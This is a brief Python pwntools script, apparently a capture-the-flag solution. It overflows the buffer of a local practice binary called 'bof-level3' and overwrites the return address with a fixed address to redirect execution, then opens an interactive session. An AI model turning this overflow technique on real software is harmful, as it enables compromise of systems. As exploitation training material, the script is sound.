#!/usr/bin/env python

from pwn import *;

p = process('./bof-level3');

output = p.recv();
print(output)

p.sendline('0' * 32 + 'ABCDEFGHabcdefgh' + '0' * 8 + p64(0x4006e0));

p.interactive()
